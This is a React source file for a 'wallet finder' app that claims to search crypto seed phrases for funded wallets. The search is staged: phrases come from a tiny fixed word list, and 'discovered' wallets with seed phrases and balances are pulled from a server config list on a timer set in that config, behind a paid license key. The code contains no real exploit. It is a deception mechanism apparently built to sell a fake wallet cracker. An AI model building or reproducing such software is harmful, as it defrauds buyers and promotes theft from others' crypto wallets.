import React, { useState, useEffect, useRef, useCallback } from "react";
import WalletHeader from "./wallet/WalletHeader";
import WalletFeed from "./wallet/WalletFeed";
import WalletStats from "./wallet/WalletStats";
import WalletNotification from "./wallet/WalletNotification";
import SearchControls from "./wallet/SearchControls";
import { API_BASE_URL } from '../config';

const PHRASES = [
 "apple banana cherry", "sun moon stars", "red blue green",
 "car bike train", "pen paper book", "cat dog bird",
 "phone laptop tablet", "tree grass flower", "light dark shadow",
 "fire water earth", "river ocean lake", "food drink dessert",
];

const WalletFinder = () => {
 const [isSearching, setIsSearching] = useState(false);
 const [walletsChecked, setWalletsChecked] = useState(0);
 const [foundBalance, setFoundBalance] = useState(0);
 const [walletFeed, setWalletFeed] = useState([]);
 const [isDarkMode, setIsDarkMode] = useState(() => {
   const saved = localStorage.getItem('theme');
   return saved ? saved === 'dark' : false;
 });
 const [config, setConfig] = useState(null);
 const [availableWallets, setAvailableWallets] = useState([]);
 const [foundWallets, setFoundWallets] = useState([]);
 const [cryptoPrices, setCryptoPrices] = useState({});
 const [isLoading, setIsLoading] = useState(true);
 const [processedWalletIds, setProcessedWalletIds] = useState(new Set());

 const searchStartTime = useRef(null);
 const hasFoundFirst = useRef(false);
 const targetDiscoveryTime = useRef(null);
 const lastUpdateTime = useRef(0);
 
 const availableWalletsRef = useRef(availableWallets);

 useEffect(() => {
   availableWalletsRef.current = availableWallets;
 }, [availableWallets]);

 const fetchCryptoPrices = useCallback(async () => {
   try {
     const response = await fetch(
       'https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,USDT,BNB,SOL,XRP,ADA,DOGE&tsyms=USD'
     );
     const prices = await response.json();
     setCryptoPrices(prices);
   } catch (error) {
     console.error('Error fetching crypto prices:', error);
   }
 }, []);

 const fetchConfig = useCallback(async () => {
   const licenseKey = localStorage.getItem('licenseKey');
   try {
     const response = await fetch(`${API_BASE_URL}/get_config.php?key=${licenseKey}`);
     const data = await response.json();
     if (data.success) {
       setConfig(data.config);
     }
   } catch (err) {
     console.error('Error fetching config:', err);
   }
 }, []);

 const fetchFoundWallets = useCallback(async () => {
  try {
    const licenseKey = localStorage.getItem('licenseKey');
    const response = await fetch(`${API_BASE_URL}/found_wallets.php?key=${licenseKey}`);
    const data = await response.json();
    if (data.success && Array.isArray(data.wallets)) {
      const processedWallets = data.wallets.map(wallet => ({
        ...wallet,
        coins: wallet.coins ? (
          Array.isArray(wallet.coins) ? wallet.coins :
          typeof wallet.coins === 'string' ? JSON.parse(wallet.coins) :
          []
        ) : []
      }));
      
      setFoundWallets(processedWallets);
      
      // Calculate total balance per coin type
      const balances = {};
      processedWallets.forEach(wallet => {
        (wallet.coins || []).forEach(coin => {
          if (coin && coin.symbol && coin.amount) {
            const amount = parseFloat(coin.amount);
            balances[coin.symbol] = (balances[coin.symbol] || 0) + amount;
          }
        });
      });
      
      setFoundBalance(balances);
    }
  } catch (error) {
    console.error('Error fetching found wallets:', error);
  }
}, []);

 const saveFoundWallet = useCallback(async (wallet) => {
   try {
     const licenseKey = localStorage.getItem('licenseKey');
     await fetch(`${API_BASE_URL}/found_wallets.php?key=${licenseKey}`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
         walletId: wallet.id
       })
     });
   } catch (error) {
     console.error('Error saving found wallet:', error);
   }
 }, []);

 const getRandomPhrase = useCallback(() => {
   const selectedPhrases = [];
   for (let i = 0; i < 3; i++) {
     const randomIndex = Math.floor(Math.random() * PHRASES.length);
     selectedPhrases.push(PHRASES[randomIndex]);
   }
   return selectedPhrases.join(" ");
 }, []);

 const addNewWallets = useCallback(() => {
   if (!config || !isSearching) return;
   
   const currentTime = Date.now();
   if (currentTime - lastUpdateTime.current < 100) return;
   
   const newWallets = [];
   for (let i = 0; i < 5; i++) {
     let phrase = getRandomPhrase();
     
     const firstWalletTiming = !hasFoundFirst.current && 
                              currentTime >= targetDiscoveryTime.current;

     const subsequentWalletTiming = hasFoundFirst.current && 
                                   availableWalletsRef.current.length > 0 && 
                                   Math.random() < 0.05;

     if ((firstWalletTiming || subsequentWalletTiming) && availableWalletsRef.current.length > 0) {
       const randomIndex = Math.floor(Math.random() * availableWalletsRef.current.length);
       const potentialWallet = availableWalletsRef.current[randomIndex];
       
       if (potentialWallet && !processedWalletIds.has(potentialWallet.id)) {
         setProcessedWalletIds(prev => new Set([...prev, potentialWallet.id]));
         
         if (!hasFoundFirst.current) {
           hasFoundFirst.current = true;
         }
         
         saveFoundWallet(potentialWallet);
         setFoundWallets(prev => [...prev, potentialWallet]);
         setAvailableWallets(prev => prev.filter(w => w.id !== potentialWallet.id));
         
         // Add the found wallet to the feed
         newWallets.push({
           ...potentialWallet,
           phrase: potentialWallet.seed_phrase,
           timestamp: currentTime + i
         });
         
         continue;
       }
     }

     newWallets.push({
       balance: "0",
       phrase: phrase,
       timestamp: currentTime + i,
       coins: []
     });
   }

   lastUpdateTime.current = currentTime;
   setWalletsChecked(prev => prev + 5);
   setWalletFeed(prevFeed => [...newWallets, ...prevFeed].slice(0, 100));
 }, [config, getRandomPhrase, isSearching, processedWalletIds, saveFoundWallet]);

 useEffect(() => {
   let animationFrame;
   const updateSearch = () => {
     if (!isSearching || !config) return;
     addNewWallets();
     animationFrame = requestAnimationFrame(updateSearch);
   };

   if (isSearching && config) {
     animationFrame = requestAnimationFrame(updateSearch);
   }

   return () => {
     if (animationFrame) {
       cancelAnimationFrame(animationFrame);
     }
   };
 }, [isSearching, config, addNewWallets]);

 useEffect(() => {
   const initializeData = async () => {
     await Promise.all([
       fetchConfig(),
       fetchCryptoPrices(),
       fetchFoundWallets()
     ]);
     setIsLoading(false);
   };

   initializeData();

   const interval = setInterval(() => {
     fetchConfig();
     fetchCryptoPrices();
     fetchFoundWallets();
   }, 5000);

   return () => clearInterval(interval);
 }, [fetchConfig, fetchCryptoPrices, fetchFoundWallets]);

 useEffect(() => {
   if (config && config.wallets) {
     const foundWalletIds = new Set(foundWallets.map(w => w.id));
     const remaining = config.wallets.filter(wallet => !foundWalletIds.has(wallet.id));
     setAvailableWallets(remaining);
   }
 }, [config, foundWallets]);

 useEffect(() => {
   localStorage.setItem('theme', isDarkMode ? 'dark' : 'light');
 }, [isDarkMode]);

 const startSearch = useCallback(() => {
   if (!config) return;
   
   searchStartTime.current = Date.now();
   lastUpdateTime.current = Date.now();
   targetDiscoveryTime.current = searchStartTime.current + config.searchDuration;
   hasFoundFirst.current = false;
   setProcessedWalletIds(new Set());
   
   setIsSearching(true);
   setWalletFeed([]);
   setWalletsChecked(0);
 }, [config]);

 const stopSearch = useCallback(() => {
   setIsSearching(false);
   searchStartTime.current = null;
   targetDiscoveryTime.current = null;
 }, []);

 if (isLoading || !config) {
  return (
    <div className={`min-h-screen w-full flex items-center justify-center ${isDarkMode ? 'bg-slate-900' : 'bg-slate-100'}`}>
      <div className="text-xl font-medium">Loading configuration...</div>
    </div>
  );
}

return (
  <div className={`min-h-screen w-full flex items-center justify-center ${isDarkMode ? 'bg-slate-900' : 'bg-slate-100'}`}>
    <div className={`w-full h-screen max-w-2xl p-4 flex flex-col md:rounded-xl shadow-2xl ${isDarkMode ? 'bg-slate-800' : 'bg-white'}`}>
      {/* Header */}
      <div className="flex-none mb-4">
        <WalletHeader 
          isDarkMode={isDarkMode} 
          onToggleTheme={() => setIsDarkMode(!isDarkMode)} 
          currencySymbol={config.currencySymbol}
        />
      </div>

      {/* Wallet Feed */}
      <div className="flex-none mb-4">
        <WalletFeed 
          wallets={walletFeed} 
          isDarkMode={isDarkMode}
          cryptoPrices={cryptoPrices}
          currencySymbol={config.currencySymbol}
        />
      </div>

      {/* Stats */}
      <div className="flex-none mb-4">
        <WalletStats 
          walletsChecked={walletsChecked}
          foundBalance={foundBalance}
          isDarkMode={isDarkMode}
          cryptoPrices={cryptoPrices}
          currencySymbol={config.currencySymbol}
        />
      </div>

      {/* Scrollable Notifications Area */}
      <div className="flex-1 overflow-y-auto mb-4">
        {foundWallets.map((wallet, index) => (
          <WalletNotification 
            key={`${wallet.id}-${index}`}
            isDarkMode={isDarkMode}
            currencySymbol={config.currencySymbol}
            foundWallet={wallet}
            cryptoPrices={cryptoPrices}
          />
        ))}
      </div>

      {/* Search Controls */}
      <div className="flex-none">
        <SearchControls 
          isSearching={isSearching}
          onStart={startSearch}
          onStop={stopSearch}
        />
      </div>
    </div>
  </div>
);
};

export default WalletFinder;